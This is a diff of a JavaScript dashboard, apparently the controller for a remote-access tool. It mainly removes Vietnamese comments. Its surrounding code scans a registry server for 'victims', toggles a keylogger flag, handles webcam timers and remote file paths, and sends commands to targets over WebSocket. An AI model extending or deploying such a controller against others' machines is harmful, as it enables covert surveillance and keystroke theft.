@@ -15,7 +15,7 @@ let webcamTimer = null;
 let webcamTimeout = null; 
 let countdownVal = 10;
 let isKeylogActive = false;
-let currentRemotePath = ""; // [ĐÃ SỬA] Thêm biến này để tránh lỗi ReferenceError
+let currentRemotePath = ""; 
 
 /* --- INITIALIZATION --- */
 document.addEventListener('DOMContentLoaded', () => {
@@ -29,12 +29,10 @@ document.addEventListener('DOMContentLoaded', () => {
         if(input) input.value = savedClientIP;
     }
 
-    // Đảm bảo tab Home luôn hiện khi tải trang
     const defaultNav = document.querySelector('.nav-item.active');
     if(defaultNav) {
         switchTab('home', defaultNav);
     } else {
-        // Fallback nếu chưa có class active
         switchTab('home', document.querySelector('.nav-item'));
     }
     
@@ -103,20 +101,17 @@ function connectToTarget(ip) {
 
 /* --- REGISTRY & DISCOVERY LOGIC --- */
 
-// [CẬP NHẬT] Hàm xử lý nút Connect & Scan
 function handleIntroScan() {
     const registryIP = "127.0.0.1";
     localStorage.setItem("auralink_registry_ip", registryIP);
     
-    // 1. Hiệu ứng UI khi bấm nút
     const btn = document.getElementById("btnConnectRegistry");
     const statusText = document.getElementById('scan-status-text');
     const listDiv = document.getElementById('scan-results');
 
     if(btn) {
-        // Đổi nút thành trạng thái đang tải
         btn.innerHTML = `<i data-lucide="loader-2" class="spinning"></i> Scanning...`;
-        btn.disabled = true; // Chặn bấm liên tục
+        btn.disabled = true; 
         btn.style.opacity = "0.8";
     }
 
@@ -124,11 +119,8 @@ function handleIntroScan() {
     if(listDiv) listDiv.innerHTML = `<div class="scan-placeholder"><i data-lucide="loader" class="spinning" style="opacity:0.5"></i></div>`;
     if(typeof lucide !== 'undefined') lucide.createIcons();
 
-    // 2. Không cần toggleScanView() nữa vì đã gộp trang
-    // Gọi hàm kết nối
     connectToRegistryServer(registryIP);
     
-    // 3. Set timeout để reset nút sau 2s (tránh trường hợp server ko phản hồi mà nút cứ quay mãi)
     setTimeout(() => {
         if(btn) {
             btn.innerHTML = `<i data-lucide="refresh-cw"></i> Refresh List`;
@@ -140,7 +132,7 @@ function handleIntroScan() {
 }
 
 function connectToRegistryServer(ip) {
-    const wsUri = `ws://${ip}:8082`; // Cổng Registry
+    const wsUri = `ws://${ip}:8082`; 
     
     const statusText = document.getElementById('scan-status-text');
     if(statusText) statusText.innerText = "Connecting to Registry Server...";
@@ -189,14 +181,13 @@ function renderDiscoveredList(data) {
     const victims = parts.slice(1); 
 
     const statusText = document.getElementById('scan-status-text');
-    // Cập nhật dòng status text
     if(statusText) {
         if (victims.length > 0 && victims[0] !== "") {
             statusText.innerText = `Found ${victims.length} active device(s).`;
-            statusText.style.color = "#34d399"; // Màu xanh lá
+            statusText.style.color = "#34d399"; 
         } else {
             statusText.innerText = "No devices found via Registry.";
-            statusText.style.color = "#fb7185"; // Màu đỏ nhạt
+            statusText.style.color = "#fb7185"; 
         }
     }
     if (victims.length === 0 || (victims.length === 1 && victims[0] === "")) {
@@ -218,7 +209,7 @@ function renderDiscoveredList(data) {
         const ip = info[0];
         const name = info[1];
         const os = info[2];
-        const port = info[3]; // Lấy port từ registry
+        const port = info[3]; 
 
         const item = document.createElement("div");
         item.className = "scan-item"; 
@@ -260,7 +251,6 @@ function connectToDirectTarget(ip, port) {
         overlay.classList.add('hidden-fade');
         setTimeout(() => {
             overlay.style.display = 'none';
-            // Truyền port vào hàm kết nối
             connectToServer(port); 
         }, 500);
     }
@@ -354,7 +344,6 @@ function updateSystemStatus(type, isActive) {
 }
 
 /* --- CONNECTION --- */
-// [ĐÃ SỬA] Thêm tham số port để kết nối động
 function connectToServer(port = 8080) {
     const ipInput = document.getElementById("ipInput");
     const ip = ipInput ? ipInput.value.trim() : '';
@@ -364,7 +353,6 @@ function connectToServer(port = 8080) {
     localStorage.setItem("auralink_last_ip", ip); 
     saveToHistory(ip);
 
-    // Sử dụng port được truyền vào, mặc định 8080
     const wsUri = "ws://" + ip + ":" + port + "/";
     
     if (websocket) {
@@ -381,7 +369,6 @@ function connectToServer(port = 8080) {
             showToast("Connected to Server Successfully"); 
             sendCmd("get-sys-info"); 
             startDashboardUpdates();
-            // [QUAN TRỌNG] Đảm bảo hiển thị tab Home khi kết nối thành công
             switchTab('home', document.querySelector('.nav-item.active'));
         };
         websocket.onclose = () => { 
